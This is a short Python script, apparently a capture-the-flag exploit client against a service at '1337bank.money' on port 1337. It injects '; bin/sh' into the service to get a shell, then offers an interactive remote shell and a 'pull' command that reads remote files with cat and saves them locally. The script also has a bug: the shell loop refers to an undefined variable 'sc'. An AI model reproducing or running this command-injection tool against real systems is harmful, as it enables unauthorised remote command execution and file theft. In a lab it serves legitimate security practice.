import socket
import os
host = "1337bank.money" 
port = 1337 

def execute_cmd(cmd):
	list = cmd.split(' ')
	if( list[0] == "shell"):
		c = '; bin/sh\n'
		s.sendall(c.encode())
		resp = s.recv(1024).decode()
		while(1):
			ans = input(">")
			if(ans == 'exit'):
				break
			ans = ans + '\n'
			s.send(ans.encode())
			if(sc[0] != 'cd'):
				resp = s.recv(1024).decode().strip()
				print(resp)
	elif ( list[0] == "pull"):
		f = open(list[2], 'w+')
		c = '; bin/sh\n'
		s.sendall(c.encode())
		resp = s.recv(1024).decode()
		ans = 'cat ' + list[1] + '\n'
		s.send(ans.encode())
		resp = s.recv(1024).decode()
		f.write(resp)
		f.close()
	elif ( list[0] == "help"):
		print("shell: for an interactive shell\npull:to get something off the server\nhelp: to get this menu\nquit: to exit program\n");
	elif ( list[0] == "quit"):
		exit()
	else:
 		print("please enter a valid command, enter help to see options")
if __name__ == '__main__':
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.connect((host, port))	
	prompt = s.recv(1024).decode()
	while(1):
			
		com = input('give me a command: ')
		execute_cmd(com)

